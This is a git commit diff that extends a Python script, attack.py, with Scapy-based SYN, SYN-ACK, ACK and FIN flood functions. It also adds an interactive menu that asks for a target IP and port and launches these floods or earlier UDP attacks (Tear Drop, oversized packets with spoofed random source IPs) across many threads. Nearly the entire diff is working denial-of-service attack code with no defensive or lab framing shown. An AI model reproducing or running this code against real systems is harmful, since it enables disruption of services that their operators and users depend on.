286adcf3ddd2a0bf67a737319257768de85fc4a3
Jason Salem <44297233+jasonsalem2002@users.noreply.github.com>
2023-10-01 20:14:18 +0300

    Added TCP attacks

--- attack.py
+++ attack.py
@@ -72,50 +72,157 @@ def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
 
         time.sleep(1)  # Update every second
 
+#Function for the Syn Flood Attack
+def syn_flood_attack(server_ip, server_port, count, progress_bar):
+     global sent_packets, start_time
+     while sent_packets < count:
+        syn_flood = IP(dst=server_ip)/TCP(dport=server_port,flags="S",seq=RandShort()) #Set the syn flag to 1 only
+        send(syn_flood, verbose=0)
+        with sent_packets_lock:
+            sent_packets += 1
+
+        progress_bar.update(1)
+        progress_bar.set_postfix(PacketsSent=sent_packets)
+
+        time.sleep(1)
+#Function for the Syn-Ack Flood Attack
+def synack_flood_attack(server_ip, server_port, count, progress_bar):
+     global sent_packets, start_time
+     while sent_packets < count:
+        synack_flood = IP(dst=server_ip)/TCP(dport=server_port,flags="SA",seq=RandShort()) #Set the syn-ack flag to 1 only
+        send(synack_flood, verbose=0)
+        with sent_packets_lock:
+            sent_packets += 1
+
+        progress_bar.update(1)
+        progress_bar.set_postfix(PacketsSent=sent_packets)
+
+        time.sleep(1)
+#Function for the Ack Flood Attack
+def ack_flood_attack(server_ip, server_port, count, progress_bar):
+     global sent_packets, start_time
+     while sent_packets < count:
+        ack_flood = IP(dst=server_ip)/TCP(dport=server_port,flags="A",seq=RandShort()) #Set the ack flag to 1 only
+        send(ack_flood, verbose=0)
+        with sent_packets_lock:
+            sent_packets += 1
+
+        progress_bar.update(1)
+        progress_bar.set_postfix(PacketsSent=sent_packets)
+
+        time.sleep(1)
+#Function for the Fin Flood Attacks
+def fin_flood_attack(server_ip, server_port, count, progress_bar):
+     global sent_packets, start_time
+     while sent_packets < count:
+        fin_flood = IP(dst=server_ip)/TCP(dport=server_port,flags="F",seq=RandShort())
+        send(fin_flood, verbose=0)
+        with sent_packets_lock:
+            sent_packets += 1
+
+        progress_bar.update(1)
+        progress_bar.set_postfix(PacketsSent=sent_packets)
+
+        time.sleep(1)
+
 # Main function
 def main():
     global start_time
-    attack_number = int(input("Choose an attack: \n1. Tear Drop\n2. Maximum Packet Size\nEnter the attack number: "))
-    number_of_packets = int(input("Enter the number of times to execute the attack: "))
-    number_of_source_ips = int(input("Enter the number of source IP addresses to generate: "))
+    server_ip = input("Server IP: ")
+    server_port = int(input("Server port: "))
+    Protocol = int(input("Choose an attack: \n1. UDP\n2. TCP\nEnter the protocol number: "))
 
-    # Server IP and port (replace with actual values)
-    server_ip = '192.168.119.130'
-    server_port = 12345
+    if Protocol == 1:
 
-    # List of source IP addresses to use (replace with actual IPs)
-    source_ips = []
+        attack_number = int(input("Choose an attack: \n1. Tear Drop\n2. Maximum Packet Size\nEnter the attack number: "))
+        number_of_packets = int(input("Enter the number of times to execute the attack: "))
+        number_of_source_ips = int(input("Enter the number of source IP addresses to generate: "))
 
-    # Generate additional random source IP addresses
-    for _ in range(number_of_source_ips):
-        source_ips.append(generate_random_ip())
+        # List of source IP addresses to use (replace with actual IPs)
+        source_ips = []
 
-    start_time = time.time()  # Record the start time
+        # Generate additional random source IP addresses
+        for _ in range(number_of_source_ips):
+            source_ips.append(generate_random_ip())
 
-    # Create a tqdm progress bar
-    with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
-        threads = []
+        start_time = time.time()  # Record the start time
 
-        if attack_number == 1:
-            attack_type = "Tear Drop"
-            for _ in range(number_of_packets):
-                thread = threading.Thread(target=send_tear_drop_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
-                threads.append(thread)
-                thread.start()
+        # Create a tqdm progress bar
+        with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
+            threads = []
 
-            for thread in threads:
-                thread.join()
+            if attack_number == 1:
+                attack_type = "Tear Drop"
+                for _ in range(number_of_packets):
+                    thread = threading.Thread(target=send_tear_drop_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
+                    threads.append(thread)
+                    thread.start()
 
-        elif attack_number == 2:
-            attack_type = "Maximum Packet Size"
-            for _ in range(number_of_packets):
-                thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
-                threads.append(thread)
-                thread.start()
+                for thread in threads:
+                    thread.join()
 
-            for thread in threads:
-                thread.join()
+            elif attack_number == 2:
+                attack_type = "Maximum Packet Size"
+                for _ in range(number_of_packets):
+                    thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
+                    threads.append(thread)
+                    thread.start()
 
+                for thread in threads:
+                    thread.join()
+
+    elif Protocol == 2:
+        attack_number = int(input("Choose an attack: \n1. Syn Flood Attack\n2. Syn-Ack Flood Attack\n3. Ack Flood Attack\n4. Fin Flood Attack\nEnter the attack number: "))
+        number_of_packets = int(input("Enter the number of times to execute the attack: "))
+
+        start_time = time.time()  # Record the start time
+
+        # Create a tqdm progress bar
+        with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
+            threads = []
+
+            if attack_number == 1:
+                attack_type = "Syn Flood"
+                for _ in range(number_of_packets):
+                    thread = threading.Thread(target=syn_flood_attack,
+                                              args=(server_ip, server_port, number_of_packets, progress_bar))
+                    threads.append(thread)
+                    thread.start()
+
+                for thread in threads:
+                    thread.join()
+
+            elif attack_number == 2:
+                attack_type = "Syn-Ack Flood"
+                for _ in range(number_of_packets):
+                    thread = threading.Thread(target=synack_flood_attack,
+                                              args=(server_ip, server_port, number_of_packets, progress_bar))
+                    threads.append(thread)
+                    thread.start()
+
+                for thread in threads:
+                    thread.join()
+
+            elif attack_number == 3:
+                attack_type = "Ack Flood"
+                for _ in range(number_of_packets):
+                    thread = threading.Thread(target=ack_flood_attack,
+                                              args=(server_ip, server_port, number_of_packets, progress_bar))
+                    threads.append(thread)
+                    thread.start()
+
+                for thread in threads:
+                    thread.join()
+            elif attack_number == 4:
+                attack_type = "Fin Flood"
+                for _ in range(number_of_packets):
+                    thread = threading.Thread(target=fin_flood_attack,
+                                              args=(server_ip, server_port, number_of_packets, progress_bar))
+                    threads.append(thread)
+                    thread.start()
+
+                for thread in threads:
+                    thread.join()
     # Calculate attack duration
     end_time = time.time()
     attack_duration = end_time - start_time
